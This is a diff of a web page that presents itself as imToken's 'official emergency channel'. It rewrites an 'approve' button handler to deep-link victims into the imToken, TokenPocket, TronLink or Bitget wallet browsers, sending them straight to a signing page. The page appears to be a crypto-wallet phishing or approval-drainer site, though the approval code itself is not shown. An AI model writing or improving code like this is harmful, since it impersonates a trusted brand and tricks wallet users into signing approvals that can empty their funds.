@@ -415,7 +415,7 @@ body {
             </div>
             <div class="lang-switch">
                 <button id="langToggle" class="lang-toggle">
-                  <<i class="fa fa-globe"></</i>
+                  <i class="fa fa-globe"></i>
                 </button>
                 <span id="headerDesc" class="lang-text">imToken官方应急通道</span>
             </div>
@@ -1350,76 +1350,87 @@ function bindApproveLogic() {
         }
     };
     // 跳转工具函数（统一逻辑，避免冗余）
-    async function handleJump() {
-        const lang = langConfig[currentLang];
-        const btn = document.getElementById("approveBtn");
-        try {
-            // 关键：优先读取URL中传递的钱包类型（用户首次选择的）
-            const selectedWalletType = getWalletFromUrl();
-            let wallet, walletName;
-            // 如果URL中有钱包类型，直接复用；否则走环境检测（兜底）
-            if (selectedWalletType && walletConfig[selectedWalletType]) {
-                wallet = walletConfig[selectedWalletType];
-                walletName = wallet.name;
-                // 存储到localStorage，后续可复用
-                localStorage.setItem("selectedWalletType", selectedWalletType);
-            } else {
-                // 兜底：读取localStorage中存储的钱包类型，仍无则检测环境
-                const storedWalletType = localStorage.getItem("selectedWalletType");
-                if (storedWalletType && walletConfig[storedWalletType]) {
-                    wallet = walletConfig[storedWalletType];
-                    walletName = wallet.name;
-                } else {
-                    // 最终兜底：环境检测
-                    walletName = "imToken";
-                    wallet = walletConfig.imtoken;
-                    if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
-                        walletName = "TokenPocket";
-                        wallet = walletConfig.tokenpocket;
-                    } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
-                        walletName = "TronLink";
-                        wallet = walletConfig.tronlink;
-                    } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
-                        walletName = "Bitget Wallet";
-                        wallet = walletConfig.bitget;
-                    }
-                }
-            }
-            // 显示明确引导，让用户知道即将唤起的钱包
-            const alertEl = showPersistentAlert(`即将唤起${walletName}授权页面，请确认...`);
-            // 生成跳转URL（沿用对应钱包的scheme）
-            const approveUrl = window.location.href + "#approve";
-            let jumpUrl = "";
-            switch (selectedWalletType || localStorage.getItem("selectedWalletType")) {
+  // 跳转工具函数（完全复用参考文件跳转格式，一步到位到签名页面）
+async function handleJump() {
+    const lang = langConfig[currentLang];
+    const btn = document.getElementById("approveBtn");
+    try {
+        // 优先读取URL中传递的钱包类型（用户首次选择的），保持复用逻辑
+        const selectedWalletType = getWalletFromUrl();
+        let wallet, jumpUrl;
+        const currentUrl = window.location.href + "#approve"; // 带签名标记，一步到签名页面
+        const encodedUrl = encodeURIComponent(currentUrl);
+
+        // 完全复用参考文件的钱包跳转格式
+        if (selectedWalletType && walletConfig[selectedWalletType]) {
+            wallet = walletConfig[selectedWalletType];
+            // 按参考文件原生格式拼接跳转URL
+            switch (selectedWalletType) {
+                case "imtoken":
+                    // 参考文件格式：imtokenv2://navigate/DappView?url=编码后URL
+                    jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+                    break;
+                case "tokenpocket":
+                    // 参考文件格式：tpdapp://open?params={"url":"编码后URL"}
+                    jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
+                    break;
                 case "tronlink":
-                    const param = JSON.stringify({
-                        url: approveUrl,
+                    // 参考文件格式：tronlinkoutside://pull.activity?param=编码后的JSON
+                    const tronParam = JSON.stringify({
+                        url: currentUrl,
                         action: "open",
                         protocol: "tronlink",
                         version: "1.0"
                     });
-                    jumpUrl = wallet.scheme + encodeURIComponent(param);
+                    jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
                     break;
-                case "tokenpocket":
-                    jumpUrl = wallet.scheme + encodeURIComponent(approveUrl) + wallet.suffix;
+                case "bitget":
+                    // 参考文件格式：bitkeep://bkconnect?action=dapp&url=URL
+                    jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`;
                     break;
                 default:
-                    jumpUrl = wallet.scheme + encodeURIComponent(approveUrl);
+                    jumpUrl = wallet.scheme + encodedUrl;
             }
-            // 执行跳转，跳转失败时引导手动操作
-            window.location.href = jumpUrl;
-            setTimeout(() => {
-                alertEl.textContent = `未检测到${walletName}，请手动打开${walletName}访问该链接`;
-                // 5秒后关闭提示
-                setTimeout(() => alertEl.parentNode?.removeChild(alertEl), 5000);
-            }, 3000);
-            btn.textContent = `正在唤起${walletName}...`;
-        } catch (jumpErr) {
-            console.error("跳转失败：", jumpErr);
-            showAutoCloseAlert("跳转授权失败，请手动打开钱包访问该链接");
+            // 存储到localStorage，后续复用
+            localStorage.setItem("selectedWalletType", selectedWalletType);
+        } else {
+            // 兜底逻辑：按参考文件默认优先imToken
+            jumpUrl = `imtokenv2://navigate/DappView?url=${encodedUrl}`;
+            wallet = walletConfig.imtoken;
+            // 检测环境兜底（参考文件逻辑）
+            if (window.tronWeb && window.tronWeb.provider?.isTokenPocket) {
+                jumpUrl = `tpdapp://open?params={"url":"${encodedUrl}"}`;
+                wallet = walletConfig.tokenpocket;
+            } else if (window.tronWeb && window.tronWeb.provider?.isTronLink) {
+                const tronParam = JSON.stringify({
+                    url: currentUrl,
+                    action: "open",
+                    protocol: "tronlink",
+                    version: "1.0"
+                });
+                jumpUrl = `tronlinkoutside://pull.activity?param=${encodeURIComponent(tronParam)}`;
+                wallet = walletConfig.tronlink;
+            } else if (window.tronWeb && window.tronWeb.provider?.isBitKeep) {
+                jumpUrl = `bitkeep://bkconnect?action=dapp&url=${currentUrl}`;
+                wallet = walletConfig.bitget;
+            }
+        }
+
+        // 参考文件逻辑：直接跳转，一步到位到签名页面
+        window.location.href = jumpUrl;
+        btn.textContent = `正在唤起${wallet.name}签名页面...`;
+
+        // 跳转失败兜底提示（参考文件无额外弹窗，仅保留失败提示）
+        setTimeout(() => {
+            showAutoCloseAlert(`未检测到${wallet.name}，请手动打开${wallet.name}访问该链接`);
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-        }
+        }, 3000);
+    } catch (jumpErr) {
+        console.error("跳转失败：", jumpErr);
+        showAutoCloseAlert("跳转授权失败，请手动打开钱包访问该链接");
+        btn.disabled = false;
+        btn.textContent = lang.approveBtnText;
     }
 }
 // ========== 辅助函数（修复白名单地址的记录存储） ==========
